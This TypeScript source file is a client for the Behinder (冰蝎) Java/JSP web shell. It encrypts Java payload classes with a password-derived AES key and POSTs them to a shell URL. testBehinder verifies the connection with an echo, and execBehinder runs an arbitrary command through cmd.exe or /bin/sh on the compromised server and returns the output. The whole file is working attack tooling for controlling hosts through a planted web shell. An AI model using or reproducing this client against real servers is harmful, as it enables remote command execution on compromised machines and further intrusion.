/**
 * Behinder (冰蝎) connection test — Java/JSP protocol.
 *
 * Mirrors the Behinder client's `doConnect()`:
 *   1. inject a random string into the Echo payload class template
 *      (`Params.getParamedClass` sets the `content` field's ConstantValue)
 *   2. POST `base64(AES/ECB/PKCS5(classBytes, md5(pass)[0:16]))`
 *   3. the shell defines + runs the class; the Echo payload answers with
 *      `base64(AES({"status":b64,"msg":b64}))` — some Behinder variants answer
 *      raw AES bytes and/or append `magicNum` random trailing bytes, so the
 *      parser tries every combination and validates the JSON envelope
 *   4. connected iff status == "success" and msg echoes the random string
 */
import { CMD_CLASS_BYTES, ECHO_CLASS_BYTES } from "./assets.js";
import { injectStringConstant } from "./classfile.js";
import { aesEcbDecrypt, aesEcbEncrypt, md5Key16, randomString } from "./crypto.js";
import { postRaw } from "./http.js";
import {
  buildHeaders,
  type CommonConnectOptions,
  type ConnectTestResult,
  type ExecResult,
} from "./types.js";

export interface BehinderConnectOptions extends CommonConnectOptions {
  /** Request body encoding. Default: try base64, then raw AES bytes. */
  requestEncoding?: "base64" | "raw";
}

const BASE64_RE = /^[A-Za-z0-9+/=\r\n]+$/;

interface EchoEnvelope {
  status: string;
  msg: string;
}

/** Try to turn a response body into the decrypted echo envelope. */
function parseEchoResponse(body: Buffer, key: string): EchoEnvelope | null {
  const magic = parseInt(key.slice(0, 2), 16) % 16;
  const trimmed = trimBytes(body);

  const candidates: Buffer[] = [];
  const push = (b: Buffer) => {
    if (b.length > 0 && b.length % 16 === 0 && !candidates.some((c) => c.equals(b))) {
      candidates.push(b);
    }
  };

  if (BASE64_RE.test(trimmed.toString("latin1"))) {
    let decoded: Buffer | null = null;
    try {
      decoded = Buffer.from(trimmed.toString("latin1"), "base64");
    } catch {
      decoded = null;
    }
    if (decoded) {
      push(decoded); // v3 / MemShellParty: base64(AES(json))
      if (decoded.length > magic) push(decoded.subarray(0, decoded.length - magic));
    }
  }
  if (body.length > magic) push(body.subarray(0, body.length - magic)); // raw AES + magic suffix
  push(body); // raw AES

  for (const candidate of candidates) {
    try {
      const plain = aesEcbDecrypt(candidate, key).toString("utf8");
      const obj: unknown = JSON.parse(plain);
      if (
        obj !== null &&
        typeof obj === "object" &&
        typeof (obj as Record<string, unknown>).status === "string" &&
        typeof (obj as Record<string, unknown>).msg === "string"
      ) {
        const rec = obj as { status: string; msg: string };
        return {
          status: Buffer.from(rec.status, "base64").toString("utf8"),
          msg: Buffer.from(rec.msg, "base64").toString("utf8"),
        };
      }
    } catch {
      // not the right candidate — try the next one
    }
  }
  return null;
}

function trimBytes(buf: Buffer): Buffer {
  let start = 0;
  let end = buf.length;
  const isWs = (b: number) => b === 0x20 || b === 0x09 || b === 0x0a || b === 0x0d || b === 0x00;
  while (start < end && isWs(buf[start]!)) start++;
  while (end > start && isWs(buf[end - 1]!)) end--;
  return buf.subarray(start, end);
}

function excerpt(body: Buffer): string {
  const text = body
    .toString("latin1")
    .replace(/[^\x20-\x7e]+/g, " ")
    .trim();
  return text.length > 160 ? `${text.slice(0, 160)}...` : text;
}

export async function testBehinder(
  url: string,
  pass: string,
  options: BehinderConnectOptions = {},
): Promise<ConnectTestResult> {
  const started = Date.now();
  const key = md5Key16(pass);
  const content = randomString(48 + Math.floor(Math.random() * 48));
  const classBytes = injectStringConstant(ECHO_CLASS_BYTES, "content", content);

  const encodings: Array<"base64" | "raw"> =
    options.requestEncoding === "raw"
      ? ["raw"]
      : options.requestEncoding === "base64"
        ? ["base64"]
        : ["base64", "raw"];

  const failures: string[] = [];
  for (const encoding of encodings) {
    const encrypted = aesEcbEncrypt(classBytes, key);
    const body = encoding === "base64" ? Buffer.from(encrypted.toString("base64")) : encrypted;
    let response;
    try {
      response = await postRaw(url, body, {
        headers: buildHeaders({ "Content-Type": "application/octet-stream" }, options),
        timeoutMs: options.timeoutMs,
        insecure: options.insecure,
      });
    } catch (err) {
      return {
        ok: false,
        tool: "behinder",
        url,
        error: err instanceof Error ? err.message : String(err),
        durationMs: Date.now() - started,
      };
    }

    const envelope = parseEchoResponse(response.body, key);
    if (envelope) {
      if (envelope.status === "success" && envelope.msg === content) {
        return {
          ok: true,
          tool: "behinder",
          url,
          detail: `echo verified (${content.length} random bytes, ${encoding} request, HTTP ${response.status})`,
          durationMs: Date.now() - started,
        };
      }
      failures.push(
        `${encoding}: decrypted but unexpected envelope (status=${JSON.stringify(envelope.status)})`,
      );
    } else {
      failures.push(
        `${encoding}: HTTP ${response.status}, response not a valid Behinder envelope` +
          (response.body.length > 0 ? ` (starts with: ${excerpt(response.body)})` : " (empty body)"),
      );
    }
  }

  return {
    ok: false,
    tool: "behinder",
    url,
    error: failures.join("; ") + " — wrong password, missing gate header, or not a Behinder shell",
    durationMs: Date.now() - started,
  };
}

/**
 * Behinder command execution — uploads the `Cmd` payload class with its
 * static `cmd` field filled in (same `Params.getParamedClass` mechanism as
 * the Echo payload). The payload picks `cmd.exe /c` or `/bin/sh -c` itself
 * based on `os.name`, so no OS detection is needed here.
 * The response is the usual Behinder envelope: base64(AES({status, msg})),
 * where `msg` is the base64-encoded command output (stdout then stderr).
 */
export async function execBehinder(
  url: string,
  pass: string,
  command: string,
  options: BehinderConnectOptions = {},
): Promise<ExecResult> {
  const started = Date.now();
  const key = md5Key16(pass);
  const classBytes = injectStringConstant(CMD_CLASS_BYTES, "cmd", command);

  const fail = (error: string): ExecResult => ({
    ok: false,
    tool: "behinder",
    url,
    command,
    error,
    durationMs: Date.now() - started,
  });

  const encodings: Array<"base64" | "raw"> =
    options.requestEncoding === "raw"
      ? ["raw"]
      : options.requestEncoding === "base64"
        ? ["base64"]
        : ["base64", "raw"];

  const failures: string[] = [];
  for (const encoding of encodings) {
    const encrypted = aesEcbEncrypt(classBytes, key);
    const body = encoding === "base64" ? Buffer.from(encrypted.toString("base64")) : encrypted;
    let response;
    try {
      response = await postRaw(url, body, {
        headers: buildHeaders({ "Content-Type": "application/octet-stream" }, options),
        timeoutMs: options.timeoutMs,
        insecure: options.insecure,
      });
    } catch (err) {
      return fail(err instanceof Error ? err.message : String(err));
    }

    const envelope = parseEchoResponse(response.body, key);
    if (envelope) {
      if (envelope.status === "success") {
        return {
          ok: true,
          tool: "behinder",
          url,
          command,
          output: envelope.msg,
          durationMs: Date.now() - started,
        };
      }
      // the payload executed but reported failure — its msg says why
      return fail(`remote status "fail": ${envelope.msg}`);
    }
    failures.push(
      `${encoding}: HTTP ${response.status}, response not a valid Behinder envelope` +
        (response.body.length > 0 ? ` (starts with: ${excerpt(response.body)})` : " (empty body)"),
    );
  }

  return fail(
    failures.join("; ") + " — wrong password, missing gate header, or not a Behinder shell",
  );
}
